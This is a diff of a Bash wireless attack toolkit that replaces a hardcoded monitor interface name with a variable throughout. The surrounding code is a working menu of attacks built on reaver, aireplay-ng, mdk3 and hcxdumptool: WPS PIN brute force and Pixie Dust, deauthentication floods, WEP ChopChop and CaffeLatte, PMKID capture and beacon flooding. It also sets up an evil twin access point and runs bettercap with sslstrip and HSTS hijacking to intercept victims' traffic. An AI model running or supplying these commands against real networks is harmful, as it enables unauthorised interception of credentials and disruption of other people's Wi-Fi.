@@ -21,10 +21,10 @@ function ctrl_c(){
     tput cnorm
     echo -ne "${greenColour}\n Bye bye ...\n${endColour}"
 
-	airmon-ng stop iw_wisecmon > /dev/null 2&>1
+	airmon-ng stop $networkCard > /dev/null 2&>1
 
-    ifconfig iw_wisec down
-    ip link set iw_wisec name $networkCard
+    ifconfig $networkCard down
+    ip link set $networkCard name $networkCard
     ifconfig $networkCard up 
 
     clear
@@ -208,7 +208,7 @@ function CaffeLatte(){
     clear
     all_banners_menu
 
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     xterm_airodump_PID=$!
 
     echo -ne "\n${blueColour}[*] Set the name of the AP: ${endColour}" && read AP_name
@@ -218,11 +218,11 @@ function CaffeLatte(){
     kill -9 $xterm_airodump_PID
     wait $airodump_xterm_PID 2>/dev/null
 
-    xterm -hold -e "airodump-ng -c $Channel -w $AP_name --essid $AP_name iw_wisecmon" &
+    xterm -hold -e "airodump-ng -c $Channel -w $AP_name --essid $AP_name $networkCard" &
 
     airodump_filter_xterm_PID=$!
 
-    xterm -hold -e "airbase-ng -c $Channel -a $AP_BSSID -e '$AP_name' -L -W 1 -x 100 iw_wisecmon" &
+    xterm -hold -e "airbase-ng -c $Channel -a $AP_BSSID -e '$AP_name' -L -W 1 -x 100 $networkCard" &
 
     xterm_airbase_PID=$!
 
@@ -250,7 +250,7 @@ function CaffeLatte(){
 function authentication_attack(){
 
     clear
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     airodump_xterm_PID=$!
 
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
@@ -261,7 +261,7 @@ function authentication_attack(){
     kill -9 $airodump_xterm_PID
     wait $airodump_xterm_PID 2>/dev/null
     
-    sleep 10; xterm -hold -e "aireplay-ng -1 0 -e ${APessid} -e '$APessid' -a '$AP_BSSID' -h '$Current_mac' iw_wisecmon" &
+    sleep 10; xterm -hold -e "aireplay-ng -1 0 -e ${APessid} -e '$APessid' -a '$AP_BSSID' -h '$Current_mac' $networkCard" &
 
     clear
     menu
@@ -272,7 +272,7 @@ function authentication_attack(){
 
 function ChopChop_attack(){
 
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     airodump_xterm_PID=$!
 
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APSSID
@@ -284,7 +284,7 @@ function ChopChop_attack(){
 
     pushd Captures  > /dev/null 2>&1
 
-    xterm -hold -e "aireplay-ng -4 -e '$APSSID' -h '$Current_mac' iw_wisecmon" &
+    xterm -hold -e "aireplay-ng -4 -e '$APSSID' -h '$Current_mac' $networkCard" &
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} ChopChop attack has been started, files will be in the Captures directory${endColour}"
     sleep 10
 
@@ -529,9 +529,9 @@ function mac_changer_func(){
     all_banners_menu
 
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} Changing the current MAC address...${endColour}"
-    ifconfig iw_wisecmon down
-    macchanger -a iw_wisecmon  > /dev/null 2>&1
-    ifconfig iw_wisecmon up
+    ifconfig $networkCard down
+    macchanger -a $networkCard  > /dev/null 2>&1
+    ifconfig $networkCard up
     echo -ne "\n${blueColour}[*]${endColour}${greenColour} MAC Changed Successfully !!${endColour}"
 
     sleep 2
@@ -548,8 +548,8 @@ function menu(){
         clear
 		wisec_banner
 
-        Current_mac=$(macchanger iw_wisecmon --show | head -n 1 | awk '{print $3}')
-        Permanent_mac=$(macchanger iw_wisecmon --show | tail -n 1 | awk '{print $3}')
+        Current_mac=$(macchanger $networkCard --show | head -n 1 | awk '{print $3}')
+        Permanent_mac=$(macchanger $networkCard --show | tail -n 1 | awk '{print $3}')
         echo -ne "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}]${endColour}${grayColour} Your Permanent MAC address: ${endColour} ${yellowColour}$Permanent_mac ${endColour}\n"
         echo -ne "${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}]${endColour}${grayColour} Your Current MAC address: ${endColour} ${yellowColour}$Current_mac ${endColour}\n"
         echo -ne "\n"
@@ -666,9 +666,9 @@ function menu(){
 
             15)
                 echo -ne "\n\t${greenColour}Bye, bye :)${endColour}\n"
-                tput cnorm; airmon-ng stop iw_wisecmon > /dev/null 2>&1
-                ifconfig iw_wisec down
-                ip link set iw_wisec name $networkCard
+                tput cnorm; airmon-ng stop $networkCard > /dev/null 2>&1
+                ifconfig $networkCard down
+                ip link set $networkCard name $networkCard
                 ifconfig $networkCard up
                 rm -r 1 iface.txt dnsmasq.conf hostapd.conf > /dev/null 2>&1
 		   #clear iptables
@@ -701,7 +701,7 @@ function wps_bruteforce(){
 
       #wash recon
 
-    xterm -hold -e "wash -i iw_wisecmon " &
+    xterm -hold -e "wash -i $networkCard " &
 
 
     xterm_wash_recon_PID=$!
@@ -713,7 +713,7 @@ function wps_bruteforce(){
     clear
 
 
-    xterm -hold -e "reaver -i iw_wisecmon -b ${BSSID_WPS} -S -vv -L -N -T .5 -r 3:15" & disown
+    xterm -hold -e "reaver -i $networkCard -b ${BSSID_WPS} -S -vv -L -N -T .5 -r 3:15" & disown
 
     sleep 15;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}${redColour} it can take several hours${endColour}\n"
     clear
@@ -729,7 +729,7 @@ function pixie_dust(){
 
     clear
 
-    xterm -hold -e "wash -i iw_wisecmon" &
+    xterm -hold -e "wash -i $networkCard" &
 
     xterm_wash_PID=$!
 
@@ -740,7 +740,7 @@ function pixie_dust(){
     clear
 
 
-    xterm -hold -e "reaver -i iw_wisecmon -b ${BSSID_WPS} -K" & disown
+    xterm -hold -e "reaver -i $networkCard -b ${BSSID_WPS} -K" & disown
 
     sleep 10;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}\n"
     clear
@@ -759,7 +759,7 @@ function null_pin_attack(){
 
     clear
 
-    xterm -hold -e "wash -i iw_wisecmon" &
+    xterm -hold -e "wash -i $networkCard" &
 
     xterm_wash_PID=$!
 
@@ -770,7 +770,7 @@ function null_pin_attack(){
     clear
 
 
-    xterm -hold -e "reaver -i iw_wisecmon -b ${BSSID_WPS} -p '' -N" & disown
+    xterm -hold -e "reaver -i $networkCard -b ${BSSID_WPS} -p '' -N" & disown
 
     sleep 10;echo -ne "\n${blueColour}[+]${endColour}${grayColour} Let the attack run for a while...${endColour}\n"
     clear
@@ -790,7 +790,7 @@ function passive_handshake(){
 
     pushd passive_handshake > /dev/null 2>&1
 
-	xterm -hold -e "airodump-ng iw_wisecmon" &
+	xterm -hold -e "airodump-ng $networkCard" &
 
     airodump_xterm_PID=$!
 
@@ -800,7 +800,7 @@ function passive_handshake(){
     kill -9 $airodump_xterm_PID
     wait $airodump_xterm_PID 2>/dev/null
 
-    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wisecmon" &
+    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid $networkCard" &
     cd ../
 
     echo -ne "\n${blueColour}[*] ${endColour}${grayColour}When you finish with getting the handshake, you have a directory called 'passive_handshake/' with all the captures${grayColour}" 
@@ -833,16 +833,15 @@ function monitor_mode_verification(){
 	rm -r ifaces.txt
 
     ifconfig $networkCard down
-    ip link set $networkCard name iw_wisec
-    ifconfig iw_wisec up
+    ifconfig $networkCard up
     clear
 
-	if [ $(iwconfig | grep iw_wisec | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
+	if [ $(iwconfig | grep $networkCard | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
 		clear
 		
-		airmon-ng start iw_wisec > /dev/null 2>&1
+		# airmon-ng start $networkCard -o -o > /dev/null 2>&1
 		sleep 2.5
-		iwconfig iw_wisec > iface.txt
+		iwconfig $networkCard > iface.txt
 
 		if [ $(cat iface.txt | grep Mode | tr ':' ' ' | awk '{print $2}') == 'Monitor' ];then
 
@@ -876,7 +875,7 @@ function pmkid_attack(){
     systemctl stop NetworkManager.service
     systemctl stop wpa_supplicant.service
 
-    xterm -hold -e "hcxdumptool -i iw_wisecmon -o dumpfile.pcapng --active_beacon --enable_status=15" &
+    xterm -hold -e "hcxdumptool -i $networkCard -o dumpfile.pcapng --active_beacon --enable_status=15" &
     hcxdumptool_xterm_PID=$!
 
 
@@ -898,12 +897,12 @@ function pmkid_attack(){
 function handshake(){
 
 
-	if [ $(iwconfig | grep iw_wisec | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
+	if [ $(iwconfig | grep $networkCard | grep 'Monitor' > /dev/null 2&>1; echo $?) -ne 0 ];then
 		clear
 		## if monitor mode was on
 		all_banners_menu
 
-	    xterm -hold -e "airodump-ng iw_wisecmon" &
+	    xterm -hold -e "airodump-ng $networkCard" &
 
     	airodump_xterm_PID=$!
 
@@ -912,11 +911,11 @@ function handshake(){
 
     	kill -9 $airodump_xterm_PID
     	wait $airodump_xterm_PID 2>/dev/null
-    	xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wisecmon" &
+    	xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid $networkCard" &
 
     	airodump_filter_xterm_PID=$!
 
-    	sleep 10; xterm -hold -e "aireplay-ng -0 5 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' iw_wisecmon" &
+    	sleep 10; xterm -hold -e "aireplay-ng -0 5 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' $networkCard" &
 
     	aireplay_xterm_PID=$!
     	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
@@ -976,14 +975,14 @@ function Beacon_Flood_attack_menu(){
             1)
                 echo -ne "${blueColour}[${endColour}${grayColour}*${endColour}${blueColour}]${endColour} ${grayColour}Pass the the name of the custom ssid file: ${endColour}" && read ssid_list;
       
-                xterm -hold -e "mdk3 iw_wisecmon b -a -g -f $ssid_list" &
+                xterm -hold -e "mdk3 $networkCard b -a -g -f $ssid_list" &
                 break
                 menu
                 ;;
       
             2)
 
-                xterm -hold -e "mdk3 iw_wisecmon b -a -w nta -m" &
+                xterm -hold -e "mdk3 $networkCard b -a -w nta -m" &
                 break
                 menu
                 ;;
@@ -1002,7 +1001,7 @@ function Beacon_Flood_attack_menu(){
 
 function constant_deauth_attack(){
 
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     airodump_xterm_PID=$!
 
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read APessid
@@ -1011,11 +1010,11 @@ function constant_deauth_attack(){
     kill -9 $airodump_xterm_PID
     wait $airodump_xterm_PID 2>/dev/null
     
-    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid iw_wisecmon" &
+    xterm -hold -e "airodump-ng -c $Channel -w ${APessid} --essid $APessid $networkCard" &
 
     airodump_filter_xterm_PID=$!
 
-    sleep 10; xterm -hold -e "aireplay-ng -0 0 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' iw_wisecmon" &
+    sleep 10; xterm -hold -e "aireplay-ng -0 0 -e ${APessid} -c 'FF:FF:FF:FF:FF:FF' $networkCard" &
 
     clear
 
@@ -1025,7 +1024,7 @@ function evilap(){
     clear
     all_banners_menu
 
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     xterm_airodump_PID=$!
 
     echo -ne "\n${blueColour}[*]${endColour}${grayColour} Set evil ap name: ${endColour}" && read ap_name
@@ -1035,7 +1034,7 @@ function evilap(){
     kill -9 $xterm_airodump_PID
 
     #hostapd config
-    echo -e "interface=iw_wisecmon" > hostapd.conf
+    echo -e "interface=$networkCard" > hostapd.conf
     echo -e "driver=nl80211" >> hostapd.conf
     echo -e "ssid=$ap_name" >> hostapd.conf
     echo -e "hw_mode=g" >> hostapd.conf
@@ -1049,12 +1048,12 @@ function evilap(){
     echo -e "[+] Hostapd started"
 
     # Config interface
-    ifconfig iw_wisecmon 10.0.0.1 netmask 255.255.255.0
+    ifconfig $networkCard 10.0.0.1 netmask 255.255.255.0
 
     echo -e "[+] Interface ip & netmask configured"
 
     #dnsmasq
-    echo -e "interface=iw_wisecmon" >> dnsmasq.conf
+    echo -e "interface=$networkCard" >> dnsmasq.conf
     echo -e "dhcp-range=10.0.0.10,10.0.0.25,255.255.255.0,12h" >> dnsmasq.conf
     echo -e "dhcp-option=3,10.0.0.1" >> dnsmasq.conf
     echo -e "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
@@ -1073,7 +1072,7 @@ function evilap(){
 
     # Ip tables (Activate internet)
     iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
-    iptables --append FORWARD --in-interface iw_wisecmon -j ACCEPT
+    iptables --append FORWARD --in-interface $networkCard -j ACCEPT
 
     # forward packets to internet
     echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -1091,7 +1090,7 @@ function eviltwin_and_sniffing(){
     clear
     all_banners_menu
 
-    xterm -hold -e "airodump-ng iw_wisecmon" &
+    xterm -hold -e "airodump-ng $networkCard" &
     xterm_airodump_PID=$!
 
 
@@ -1102,7 +1101,7 @@ function eviltwin_and_sniffing(){
     kill -9 $xterm_airodump_PID
 
     #hostapd config
-    echo -e "interface=iw_wisecmon" > hostapd.conf
+    echo -e "interface=$networkCard" > hostapd.conf
     echo -e "driver=nl80211" >> hostapd.conf
     echo -e "ssid=$ap_name" >> hostapd.conf
     echo -e "hw_mode=g" >> hostapd.conf
@@ -1116,12 +1115,12 @@ function eviltwin_and_sniffing(){
     echo -e "[+] Hostapd started"
 
     # Config interface
-    ifconfig iw_wisecmon 10.0.0.1 netmask 255.255.255.0
+    ifconfig $networkCard 10.0.0.1 netmask 255.255.255.0
 
     echo -e "[+] Interface ip & netmask configured"
 
     #dnsmasq
-    echo -e "interface=iw_wisecmon" >> dnsmasq.conf
+    echo -e "interface=$networkCard" >> dnsmasq.conf
     echo -e "dhcp-range=10.0.0.10,10.0.0.25,255.255.255.0,12h" >> dnsmasq.conf
     echo -e "dhcp-option=3,10.0.0.1" >> dnsmasq.conf
     echo -e "dhcp-option=6,10.0.0.1" >> dnsmasq.conf
@@ -1141,7 +1140,7 @@ function eviltwin_and_sniffing(){
 
     # Ip tables (Activate internet)
     iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
-    iptables --append FORWARD --in-interface iw_wisecmon -j ACCEPT
+    iptables --append FORWARD --in-interface $networkCard -j ACCEPT
 
     # forward packets to internet
     echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -1151,7 +1150,7 @@ function eviltwin_and_sniffing(){
     echo -e "[+] sniffing ..."
 
     # sniffing
-    xterm -T "Bettercap (Sniffing)" -hold -e "bettercap -iface iw_wisecmon -eval 'net.probe on; net.recon on; net.sniff on;set http.proxy.sslstrip true;hstshijack/hstshijack'" &
+    xterm -T "Bettercap (Sniffing)" -hold -e "bettercap -iface $networkCard -eval 'net.probe on; net.recon on; net.sniff on;set http.proxy.sslstrip true;hstshijack/hstshijack'" &
 
 
 }
